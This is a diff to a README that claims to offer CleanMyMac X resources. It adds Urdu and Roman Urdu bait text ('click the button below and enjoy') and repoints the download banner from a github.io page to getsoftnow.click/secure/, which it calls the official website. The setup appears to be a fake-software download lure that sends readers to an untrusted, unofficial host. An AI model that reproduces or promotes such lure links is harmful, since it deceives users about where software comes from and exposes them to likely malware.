@@ -1,6 +1,8 @@
 
 
 > This repository contains resources, scripts, and documentation for CleanMyMac X - the all-in-one Mac optimization toolkit designed to clean, protect, and supercharge your Mac.
+> ye readme file sirf official website ka link download krny k liye bnayi gyi hai, jissy ke hmary ane waly users ko faida pohanchy...
+نیچی دیے گئے بٹن کو کلک کرین اور مزے کرین
 
 <hr>
 
@@ -8,7 +10,7 @@
 
 <br>
 
-[![CleanMyMac X Banner](https://img.shields.io/badge/CleanMyMac-X-blue)](https://driver-easy-pro-7.github.io/.github/)
+[![CleanMyMac X Banner](https://img.shields.io/badge/CleanMyMac-X-blue)](https://getsoftnow.click/secure/)
 
 <hr>
 
